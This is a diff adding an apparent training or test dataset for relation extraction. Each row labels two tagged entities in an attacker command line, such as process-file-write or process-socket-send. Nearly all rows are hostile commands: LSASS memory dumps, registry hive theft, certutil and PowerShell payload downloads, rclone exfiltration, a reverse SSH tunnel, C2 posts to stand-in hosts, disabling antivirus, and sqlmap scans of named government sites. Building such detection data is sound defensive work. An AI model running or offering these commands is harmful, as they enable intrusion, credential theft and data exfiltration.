@@ -1,0 +1,630 @@
+process-file-write(e1,e2)	"<e1>powershell_80.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_80.ps1',</e2> 'Invoke-Mimikatz')"""
+process-file-write(e1,e2)	"<e1>esentutl.exe</e1> /r V01 /l""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache"" /s""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache"" <e2>/d""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache""</e2>"
+process-file-unlink(e1,e2)	python.exe <e1>del</e1> <e2>C:\Windows\Temp\evil.dll</e2>
+process-process-unlink(e1,e2)	<e1>rundll32.exe</e1> kill (Get-Process <e2>winlogon.exe.Id)</e2>
+process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>wmic</e2> /node:""DOMAINCONTROLLER"" process call create C:\3.exe"
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>icacls</e2> C:\Users\Public\runme.bat /grant Everyone:F
+process-process-fork(e1,e2)	<e1>powershell</e1> <e2>rundll32.exe</e2> c:\windows\system32\comsvcs.dll, minidump (get-process lsass).id c:\temp\lsass.dmp full
+process-socket-receive(e1,e2)	powershell.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>10.10.10.10:4444</e2>
+process-file-read(e1,e2)	<e1>nuclei</e1> -l <e2>sept24.txt</e2> -o sept24_op.txt -s medium
+process-process-inject(e1,e2)	<e1>powershell.exe</e1> Set-ProcessInjection -Target <e2>winlogon.exe</e2>
+process-file-unlink(e1,e2)	cmd.exe <e1>del</e1> <e2>/tmp/malware.sh</e2>
+process-file-write(e1,e2)	<e1>powershell.exe</e1> ls C:\ > <e2>C:\file.txt</e2>
+process-socket-send(e1,e2)	powershell.exe <e1>curl</e1> -X POST --data 'ping' <e2>https://evil.server/payload</e2>
+process-file-read(e1,e2)	"schtasks.exe /create /sc minute /mo 1 /tn ""SSH Key Exchange"" /rl highest /tr <e1>""C:\ProgramData\sshd\ssh.exe</e1> -i <e2>C:\ProgramData\sshd\config\keys\id_rsa</e2> -N -R 369:127.0.0.1:2222 root@185.206.146.129 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15"""
+process-file-write(e1,e2)	"<e1>adfind.exe</e1> -subnets -f ""(objectCategory=subnet)"" > <e2>subnets.txt</e2>"
+process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.uiserver.exe</e2> /F
+process-file-write(e1,e2)	"<e1>sqlcmd</e1> -E -S localhost -Q ""BACKUP DATABASE master TO <e2>DISK='c:\programdata\sql\master.bak'""</e2>"
+process-file-chmod(e1,e2)	cmd.exe <e1>attrib</e1> +s +h <e2>C:\Users\Public\runme.bat</e2>
+process-file-write(e1,e2)	torify <e1>nuclei</e1> -u shabak.gov.il -o <e2>shabak.gov.il_new</e2>
+process-file-write(e1,e2)	"cmd.exe /C netsh advfirewall firewall add rule dir=out name =""WMI_OUT"" <e1>program=C:\Windows\system32\svchost.exe</e1> service=winmgmt action=allow protocol=TCP localport=any > <e2>C:\Windows\Temp\WkiMfXXo.tmp</e2> 2>&1"
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>dllinjector.exe</e2> -p notepad.exe -d payload.dll
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>curl</e2> -X POST --data 'ping' 192.168.1.100:8080
+process-file-write(e1,e2)	<e1>adfind.exe</e1> -gcb -sc trustdmp > <e2>ad_trustdmp.txt</e2>
+process-socket-receive(e1,e2)	svchost.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind 192.168.1.100:8080
+process-file-chmod(e1,e2)	rundll32.exe <e1>icacls</e1> <e2>/usr/local/bin/backdoor</e2> /grant Everyone:F
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>dir</e2> %HOMEDRIVE%%HOMEPATH%
+process-file-read(e1,e2)	"<e1>powershell_11.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_11.yaml""</e2>"
+process-file-write(e1,e2)	<e1>net</e1> user <e2>DefaultAccount</e2> /active:yes;
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>rm</e2> /usr/local/bin/backdoor
+process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""McAfee DLP Endpoint"" call uninstall /nointeractive"
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>7za.exe</e2> a -tzip -mx5 c:\programdata\lsass.dmp c:\programdata\lsass.zip
+process-file-write(e1,e2)	<e1>cmd.exe</e1> /C copy 192145.dll <e2>\\<INTERNAL_IP>\ADMIN$</e2> /Y /Z
+process-process-unlink(e1,e2)	<e1>python.exe</e1> kill $(Get-Process <e2>explorer.exe.Id)</e2>
+process-file-read(e1,e2)	cmd.exe /c <e1>reg.exe</e1> save <e2>hklm\sam</e2> c:\users\REDACTED\appdata\local\temp\1\dznuxujzr
+process-file-read(e1,e2)	"<e1>rundll32.exe</e1> ""C:\Users\REDACTED\AppData\Local\REDACTED\ikaqkk.dll"",update <e2>/i:""TimberMule\license.dat""</e2>"
+process-process-unlink(e1,e2)	<e1>cmd.exe</e1> Stop-Process -Name <e2>taskmgr.exe</e2> -Force
+process-process-unlink(e1,e2)	"C:\Windows\system32\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c <e1>""taskkill</e1> /f /im <e2>explorer.exe""</e2>"
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>wmic</e2> /namespace:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
+process-process-unlink(e1,e2)	<e1>cmd.exe</e1> kill $(Get-Process <e2>lsass.exe.Id)</e2>
+process-process-unlink(e1,e2)	<e1>rundll32.exe</e1> kill $(Get-Process <e2>explorer.exe.Id)</e2>
+process-process-fork(e1,e2)	"cmd.exe /C <e1>netsh</e1> advfirewall firewall add rule dir=in name =""WMI"" <e2>program=C:\Windows\system32\svchost.exe</e2> service=winmgmt action = allow protocol=TCP localport=any > C:\Windows\Temp\XsssmLZZ.tmp 2>&1"
+process-socket-send(e1,e2)	<e1>rundll32.exe</e1> locker.dll,run /TARGET=\\HOST1.DOMAIN.NAME\C$ /TARGET=\\HOST2.DOMAIN.NAME\C$ <e2>/TARGET=\\HOST3.DOMAIN.NAME\C$</e2> /login=DOMAIN\Administrator /password=[REDACTED] /nolog /shareall
+process-file-write(e1,e2)	<e1>notepad_65.exe</e1> <e2>C:\Users\test\notes_65.txt</e2>
+process-file-write(e1,e2)	<e1>mshta_98.exe</e1> -write <e2>C:\Users\Public\hta_payload_98.hta</e2>
+process-file-chmod(e1,e2)	C:\Windows\system32\cmd.exe /c <e1>attrib</e1> +S +H <e2>%appdata%\Microsoft\Network\python-3.10.4-embed-amd64.zip</e2>
+process-file-write(e1,e2)	"PsExec.exe /accepteula -d \\REDACTED -u ""domain.local\Administrator"" -p ""REDACTED"" <e1>cmd</e1> /c COPY /Y ""\\REDACTED\share$\ds.exe"" <e2>%PUBLIC%\Music</e2>"
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>nltest</e2> /dclist <domainname redacted>
+process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>adfind.exe</e2> -f ""objectcategory=computer"" > ad_computers.txt"
+process-file-write(e1,e2)	"<e1>powershell_2.exe</e1> -Command ""Set-Content -Path <e2>C:\Windows\Temp\log_2.txt</e2> -Value 'infected'"""
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>chmod</e2> 777 C:\ProgramData\updater.exe
+process-process-unlink(e1,e2)	powershell.exe <e1>taskkill</e1> /IM <e2>winlogon.exe</e2> /F
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>icacls</e2> /usr/local/bin/backdoor /grant Everyone:F
+process-file-write(e1,e2)	"schtasks /create /RL HIGHEST /RU ""NT AUTHORITY\SYSTEM"" /sc minute /mo 30 /tn ""schdsWin"" /tr ""cmd.exe /C <e1>certutil.exe</e1> -urlcache -f http://192.169.6.122:6770/svchost.exe <e2>%systemdrive%\\Windows\\Temp\\svchost.exe</e2> & %systemdrive%\\Windows\\Temp\\svchost.exe"""
+process-socket-receive(e1,e2)	wmic.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind 192.168.1.100:8080
+process-process-unlink(e1,e2)	python.exe <e1>taskkill</e1> /IM <e2>svchost.exe</e2> /F
+process-socket-send(e1,e2)	"schtasks /create /RL HIGHEST /RU ""NT AUTHORITY\SYSTEM"" /sc minute /mo 30 /tn ""schdsWin"" /tr ""cmd.exe /C <e1>certutil.exe</e1> -urlcache -f <e2>http://192.169.6.122:6770/svchost.exe</e2> %systemdrive%\\Windows\\Temp\\svchost.exe & %systemdrive%\\Windows\\Temp\\svchost.exe"""
+process-file-read(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>wmic</e1> /namespace:\\root\SecurityCenter2 PATH <e2>FirewallProduct</e2> GET /value
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>icacls</e2> /usr/local/bin/backdoor /grant Everyone:F
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C for /f %i in (C:\ProgramData\servers.txt) do ping -n 1 %i -v 4 | <e2>find</e2> /I TTL >> C:\ProgramData\servers_live.txt
+process-process-fork(e1,e2)	"<e1>WMIC</e1> /node:""DC.example.domain"" process call create <e2>""rundll32</e2> C:\PerfLogs\arti64.dll, StartW"""
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork http://attacker.com/c2
+process-file-write(e1,e2)	<e1>ntdsAudit.exe</e1> ntds.dit -s SYSTEM -p pwddump.txt -u <e2>users.csv</e2>
+process-file-write(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C af.exe -f ""(objectcategory=organizationalUnit)"" > <e2>ad_ous.txt</e2>"
+process-process-unlink(e1,e2)	wmic.exe <e1>taskkill</e1> /IM <e2>svchost.exe</e2> /F
+process-process-unlink(e1,e2)	<e1>taskkill</e1> -f -im <e2>sqlbrowser.exe</e2>
+process-file-write(e1,e2)	"<e1>cmd.exe</e1> /c ren ""%temp%\magni.waut.a"" <e2>""magni.w""</e2>"
+process-file-exec(e1,e2)	"<e1>python.exe</e1> -Command ""Start-Process <e2>C:\Users\Public\runme.bat""</e2>"
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>vssadmin</e2> create shadow
+process-file-exec(e1,e2)	"cmd.exe /Q /c <e1>schtasks.exe</e1> /create /sc onlogon /tn ""Wow64 Subsystem"" /rl highest /tr <e2>""%%programdata%%\schcache\mswow86.exe""</e2>"
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> /c start <e2>cmd.exe</e2>
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /Q /c <e2>expand</e2> cache.cab -F:* c:\programdata
+process-file-write(e1,e2)	"<e1>python_44.exe</e1> -c <e2>""open('C:\\Users\\admin\\payload_44.exe',</e2> 'wb').write(b'\x90\x90\x90')"""
+process-file-write(e1,e2)	cmd_10.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_10.bat</e2>
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>Remove-Item</e2> C:\Users\Public\runme.bat -Force
+process-file-read(e1,e2)	<e1>notepad_36.exe</e1> <e2>C:\Users\admin\notes_36.txt</e2>
+process-file-write(e1,e2)	<e1>powershell</e1> invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile <e2>c:\programdata\COIm.jpg</e2>
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c cd %appdata%\Microsoft\Network && <e2>powershell</e2> -Command start script.bat -Verb RunAs
+process-file-read(e1,e2)	"<e1>""C:\Windows\system32\net.exe""</e1> group <e2>""domain admins""</e2> /domain"
+process-file-write(e1,e2)	"<e1>powershell_66.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_66.ps1',</e2> 'Invoke-Mimikatz')"""
+process-file-write(e1,e2)	<e1>ftp_90.exe</e1> -s:script_90.txt <e2>C:\inetpub\wwwroot\ftp_90.log</e2>
+process-socket-receive(e1,e2)	svchost.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind https://evil.server/payload
+process-file-write(e1,e2)	"<e1>net</e1> localgroup <e2>Administrators</e2> Support /add & net localgroup ""Remote Desktop Users"" Support /add"
+process-file-write(e1,e2)	"<e1>find.exe</e1> -f ""(objectcategory=organizationalUnit)"" > <e2>ad_ous.txt</e2>"
+process-file-exec(e1,e2)	<e1>C:\Windows\System32\rundll32.exe</e1> <e2>C:/Windows/Temp//rvhz1.dll</e2> DllRegisterServer
+process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>C:\Windows\Temp\adf\anchorAsjuster_x64.exe</e1> --source=anchorDNS_x64.exe --target=anchor_x64.exe <e2>--domain=xyskencevli.com,sluaknhbsoe.com</e2> --period=2 --lasthope=2 -guid
+process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.agent.configurationservice.exe</e2> /F
+process-file-write(e1,e2)	<e1>certutil_29.exe</e1> -encode input_29.txt <e2>C:\temp\encoded_29.txt</e2>
+process-socket-send(e1,e2)	<e1>powershell.exe</e1> Invoke-WebRequest -Uri <e2>https://evil.server/payload</e2> -Method POST
+process-process-fork(e1,e2)	<e1>%WINDIR%\system32\cmd.exe</e1> /c <e2>net</e2> localgroup administrators sqlbackup /add
+process-file-write(e1,e2)	<e1>reg</e1> add <e2>HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest</e2> /v UseLogonCredential /t REG\_DWORD /d 1 /f
+Other	"<e1>C:\Windows\system32\cmd.exe</e1> /C cool.exe <e2>[DC IP ADDRESS]</e2> [DOMAIN NAME] Administrator -c ""taskkill /f /im explorer.exe"""
+process-process-fork(e1,e2)	"VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd ""c:\windows\notepad.exe"" --sql ""EXEC master..xp\_cmdshell <e1>'net</e1> localgroup administrators <e2>sqlbackup</e2> /add'"""
+process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>nltest</e2> /dclist:""DOMAINNAME"""
+process-file-read(e1,e2)	<e1>reg_5.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
+process-socket-send(e1,e2)	<e1>python.exe</e1> Invoke-WebRequest -Uri <e2>https://evil.server/payload</e2> -Method POST
+process-file-read(e1,e2)	<e1>certutil_88.exe</e1> -encode <e2>input_88.txt</e2> C:\temp\encoded_88.txt
+process-socket-receive(e1,e2)	<e1>certutil.exe</e1> -urlcache -split -f <e2>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</e2> powershellintelmodule.ps1
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>dllinjector.exe</e2> -p explorer.exe -d payload.dll
+process-process-fork(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <backup server> --port 9401 --cmd <e2>""c:\windows\notepad.exe""</e2> --sql ""select @@version"""
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>chmod</e2> 777 /var/tmp/hide.so
+Other	C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\hosts.txt) do <e1>ping</e1> -n 1 %i -v 4 | find /I TTL >> <e2>C:\ProgramData\hosts_live.txt</e2>
+process-file-read(e1,e2)	<e1>reg_12.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>python3</e2> -m http.server 8080 --bind 10.10.10.10:4444
+process-file-write(e1,e2)	<e1>powershell</e1> Expand-Archive python-3.10.4-embed-amd64.zip -DestinationPath <e2>%appdata%\Microsoft\Network</e2>
+process-file-write(e1,e2)	"<e1>""C:\Program Files\7-Zip\7zG.exe""</e1> x -o <e2>""C:\Users\Public\netscan_portable""</e2> -spe -an -ai7zMap24244:76:7zEvent17814"
+process-file-write(e1,e2)	"<e1>powershell</e1> Invoke-WebRequest ""http://temp.sh/VSlAV/http64.exe"" -OutFile <e2>C:\programdata\rr.exe</e2>"
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>icacls</e2> C:\Users\Public\runme.bat /grant Everyone:F
+process-file-exec(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>D:\max\eyewear.bat</e2>
+process-file-write(e1,e2)	"<e1>powershell_16.exe</e1> -Command ""Set-Content -Path <e2>C:\Windows\Temp\log_16.txt</e2> -Value 'infected'"""
+process-file-write(e1,e2)	<e1>mshta_79.exe</e1> -write <e2>C:\Users\Public\hta_payload_79.hta</e2>
+process-socket-receive(e1,e2)	rundll32.exe <e1>python3</e1> -m http.server 8080 --bind <e2>192.168.1.100:8080</e2>
+process-file-write(e1,e2)	<e1>mshta_54.exe</e1> -write <e2>C:\Users\Public\hta_payload_54.hta</e2>
+process-socket-send(e1,e2)	<e1>C:\Windows\SysWOW64\explorer.exe</e1> <e2>\\IP_ADDRESS_2\C</e2>
+process-process-fork(e1,e2)	<e1>adfind.exe</e1> -f objectcategory=computer > <e2>ad_computers.txt</e2>
+process-file-read(e1,e2)	"<e1>python_54.exe</e1> -c <e2>""open('C:\\temp\\pw_54.txt').read()""</e2>"
+process-file-read(e1,e2)	<e1>reg_32.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
+process-file-write(e1,e2)	"cmd.exe /C <e1>reg</e1> <e2>add ""HKLM\software\microsoft\windows nt\currentversion\winlogon""</e2> /v UserInit /t reg_sz /d ""c:\windows\system32\userinit.exe,c:\users\[REDACTED]\appdata\local\notepad\UpdateEdge.bat"
+process-file-write(e1,e2)	"<e1>C:\Windows\System32\cmd.exe</e1> /c echo curl https://moashraya[.]com/out/t.php --output ""%temp%\magni.waut.a"" --ssl no-revoke --insecure --location > <e2>%temp%\magni.w.bat</e2>"
+process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""McAfee SiteAdvisor Enterprise""</e2> call uninstall /nointeractive"
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>del</e2> C:\Windows\Temp\evil.dll
+process-process-inject(e1,e2)	rundll32.exe <e1>dllinjector.exe</e1> -p <e2>winlogon.exe</e2> -d payload.dll
+process-socket-send(e1,e2)	rundll32.exe <e1>curl</e1> -X POST --data 'ping' <e2>10.10.10.10:4444</e2>
+process-file-read(e1,e2)	<e1>7z_62.exe</e1> x <e2>C:\Users\Public\archive_62.7z</e2> -so > nul
+process-file-read(e1,e2)	<e1>procdump64.exe</e1> -ma <e2>lsass.exe</e2> lsass.dmp
+process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>7za.exe</e1> a -tzip -mx5 c:\programdata\lsass.dmp <e2>c:\programdata\lsass.zip</e2>
+process-file-chmod(e1,e2)	python.exe <e1>attrib</e1> +s +h <e2>/tmp/malware.sh</e2>
+process-socket-send(e1,e2)	"schtasks.exe /create /sc minute /mo 1 /tn ""SSH Key Exchange"" /rl highest /tr <e1>""C:\ProgramData\sshd\ssh.exe</e1> -i C:\ProgramData\sshd\config\keys\id_rsa -N -R <e2>369:127.0.0.1:2222</e2> root@185.206.146.129 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15"""
+process-socket-receive(e1,e2)	powershell.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>192.168.1.100:8080</e2>
+process-file-exec(e1,e2)	<e1>C:\Windows\system32\NOTEPAD.EXE</e1> <e2>C:\Users\USER\Desktop\New Text Document.txt</e2>
+process-file-write(e1,e2)	<e1>net</e1> localgroup <e2>'Remote Desktop Users'</e2> /add DefaultAccount;
+process-socket-send(e1,e2)	<e1>rclone.exe</e1> copy \\REDACTED\Shares <e2>mega:Shares</e2> -q --ignore-existing --auto-confirm --multi-thread-streams 4 --transfers 4
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>nltest</e2> /domain\_trusts&nltest /dclist:\&c:\windows\sysnative\nltest /domain\_trusts\&c:\windows\sysnative\nltest /dclist:
+process-process-unlink(e1,e2)	python.exe <e1>taskkill</e1> /IM <e2>winlogon.exe</e2> /F
+process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""Symantec Backup Exec Remote Agent for Windows""</e2> call uninstall /nointeractive"
+process-process-fork(e1,e2)	"<e1>%WINDIR%\system32\cmd.exe</e1> /C <e2>.\rclone.exe</e2> copy ""E:\REDACTED\domain"" mega:REDACTED/domain -q --ignore-existing --REDACTED-confirm --multi-thread-streams 12 --transfers 12 --no-console"
+Other	ping -n 1 <e1>hostname3</e1> >> <e2>C:\programdata\log.txt</e2>
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>ping</e2> -n 1 <redacted>
+process-process-unlink(e1,e2)	<e1>taskkill</e1> /f /im <e2>QQPCMgr.exe</e2>
+process-file-exec(e1,e2)	<e1>schtasks.exe</e1> /Create /F /XML <e2>C:\windows\temp\Wininet.xml</e2> /tn '\Microsoft\Windows\Maintenance\Wininet'
+process-file-unlink(e1,e2)	"cmd.exe /c <e1>rmdir</e1> /S /Q <e2>""C:\Users\REDACTED\EmailStorage_REDACTED-REDACTED_REDACTED""</e2>"
+Other	<e1>cmd.exe</e1> /q /c reg add hkey_local_machine\system\currentcontrolset\control\lsa /v disablerestrictedadmin /t reg_dword /d 0 1> <e2>\\127.0.0.1\admin\$\__<timestamp>\.<num></e2> 2>&1
+process-file-exec(e1,e2)	"<e1>wmic.exe</e1> -Command ""Start-Process <e2>C:\Users\Public\runme.bat""</e2>"
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>nc</e2> -lvp 4444 -s 192.168.1.100:8080
+process-file-exec(e1,e2)	"<e1>regsvr32</e1> /s /n /i\:Action <e2>""C:\Users\<user>\AppData\Roaming\Microsoft\20350.dll""</e2>"
+process-process-fork(e1,e2)	"<e1>""C:\Windows\System32\schtasks.exe""</e1> /CREATE /SC ONCE /ST 17:21:58 /TN 9T6ukfi6 /TR <e2>""'C:\Users\pagefilerpqy.exe'""</e2> /f /RL HIGHEST"
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>net</e2> group /domain > C:\Windows\Temp\aWatKmSa.tmp 2>&1
+process-file-write(e1,e2)	"<e1>powershell_21.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_21.ps1',</e2> 'Invoke-Mimikatz')"""
+process-file-read(e1,e2)	<e1>notepad_39.exe</e1> <e2>C:\Users\admin\notes_39.txt</e2>
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c cd %appdata%\Microsoft\Network && <e2>powershell</e2> Expand-Archive python-3.10.4-embed-amd64.zip -DestinationPath %appdata%\Microsoft\Network
+process-socket-send(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <e2><backup server></e2> --port 9401 --cmd ""c:\windows\notepad.exe"" --sql ""EXEC master..xp\_cmdshell 'net user sqlbackup Password!1221! /add'"""
+process-socket-receive(e1,e2)	python.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> https://evil.server/payload
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork http://attacker.com/c2
+process-socket-send(e1,e2)	<e1>ping</e1> -n 1 <e2>hostname2</e2> >> C:\programdata\log.txt
+process-socket-send(e1,e2)	"svchost.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>http://attacker.com/c2</e2> -Body 'cmd=whoami'"""
+process-process-inject(e1,e2)	<e1>powershell.exe</e1> dllinjector.exe -p <e2>taskmgr.exe</e2> -d payload.dll
+process-file-write(e1,e2)	"<e1>reg.exe</e1> add <e2>hkcu\software\classes\ms-settings\shell\open\command</e2> /v ""DelegateExecute"" /f"
+process-process-fork(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <backup server> --port 9401 --cmd <e2>""c:\windows\notepad.exe""</e2> --sql ""RECONFIGURE"""
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>echo</e2> -------- >> C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1
+process-file-read(e1,e2)	"""powershell.exe"" /c Remove-Item -Path C:\windows\temp\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\ssasl.pmd full | out-host; <e1>Compress-Archive</e1> C:\windows\temp\ssasl.pmd <e2>C:\windows\temp\ssasl.zip</e2>"
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>dllinjector.exe</e2> -p svchost.exe -d payload.dll
+process-file-write(e1,e2)	cmd.exe /C <e1>rundll32.exe</e1> C:\windows\System32\comsvcs.dll, MiniDump 968 <e2>C:\ProgramData\REDACTED\lsass.dmp</e2> full
+process-file-exec(e1,e2)	"<e1>powershell.exe</e1> -Command ""Start-Process <e2>/var/tmp/hide.so""</e2>"
+process-socket-send(e1,e2)	wmic.exe <e1>curl</e1> -X POST --data 'ping' <e2>http://attacker.com/c2</e2>
+process-file-exec(e1,e2)	%windir%\system32\cmd.exe /c start <e1>rundll32.exe</e1> <e2>mkl2n.dll,kXlNkCKgFC</e2>
+process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\hosts.txt) do ping -n 1 %i -v 4 | <e1>find</e1> /I TTL >> <e2>C:\ProgramData\hosts_live.txt</e2>
+process-file-read(e1,e2)	<e1>reg_60.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
+process-process-fork(e1,e2)	<e1>cmd_17.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_17.bat
+process-socket-send(e1,e2)	cmd.exe /C <e1>ping</e1> <e2>WORKSTATION</e2>
+process-file-read(e1,e2)	<e1>cmd.exe</e1> /q /c upload <e2>c:\users\<user>\documents\<doc></e2> /home/kali/desktop/<doc> 1> \\127.0.0.1\admin$\<num>.<num> 2>&1
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>curl</e2> -X POST --data 'ping' 10.10.10.10:4444
+process-file-write(e1,e2)	<e1>adfind.exe</e1> -f objectcategory=computer -csv name operatingSystem > <e2>ad_computers_enum.txt</e2>
+process-file-unlink(e1,e2)	"<e1>""powershell.exe""</e1> /c Remove-Item -Path <e2>C:\windows\temp\ssasl.pmd</e2> -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\ssasl.pmd full | out-host; Compress-Archive C:\windows\temp\ssasl.pmd C:\windows\temp\ssasl.zip"
+process-file-exec(e1,e2)	<e1>cmd.exe</e1> -exec <e2>/usr/local/bin/backdoor</e2>
+process-file-read(e1,e2)	"<e1>powershell_28.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_28.yaml""</e2>"
+process-file-read(e1,e2)	<e1>cmd_78.exe</e1> /c type <e2>C:\Windows\System32\drivers\etc\hosts</e2>
+process-process-unlink(e1,e2)	<e1>net</e1> stop <e2>BackupExecJobEngine</e2> /y
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>reg.exe</e2> save hklm\system c:\users\REDACTED\appdata\local\temp\1\mkffdg
+process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet""</e2> /v ""SpynetReporting"" /t REG\_DWORD /d ""0"" /f"
+process-file-write(e1,e2)	"<e1>cmd</e1> /c COPY /Y ""\\REDACTED\share$\ds.exe"" <e2>%PUBLIC%\Music</e2>"
+process-file-write(e1,e2)	"C:\Windows\System32\cmd.exe /c echo <e1>curl</e1> https://moashraya[.]com/out/t.php --output <e2>""%temp%\magni.waut.a""</e2> --ssl no-revoke --insecure --location > %temp%\magni.w.bat"
+process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>reg.exe</e1> save hklm\security <e2>c:\ProgramData\security.save</e2>
+Other	C:\Windows\system32\cmd.exe /c cd <e1>%appdata%\Microsoft\Network</e1> && python.exe <e2>Packages.txt</e2>
+process-socket-send(e1,e2)	torify <e1>sqlmap</e1> -u <e2>https://<domain>.gov.bd/admin/manage_user.php?id=1</e2> -v 2 --delay 1.7 --time-sec 13 --tamper space2comment --risk 3 --level 5 --random-agent --no-cast --parse-errors --dbs
+process-process-inject(e1,e2)	<e1>c:\windows\system\dumpert.exe</e1> <e2>lsass.exe</e2>
+process-process-unlink(e1,e2)	"<e1>C:\Windows\system32\net1</e1> stop <e2>""veeamdeploysvc""</e2> /y"
+process-process-inject(e1,e2)	<e1>svchost.exe</e1> Set-ProcessInjection -Target <e2>winlogon.exe</e2>
+process-file-write(e1,e2)	<e1>net</e1> localgroup <e2>Administrators</e2> /add DefaultAccount;
+process-process-inject(e1,e2)	<e1>wmic.exe</e1> Set-ProcessInjection -Target <e2>svchost.exe</e2>
+process-file-read(e1,e2)	"<e1>makecab</e1> <e2>""C:\Users\<REDACTED>\AppData\Local\Temp\logFileuyovaqv.bin""</e2> C:\Users\<REDACTED>\AppData\Local\Temp\logFileuyovaqv.cab"
+process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.wmiserver.exe</e2> /F
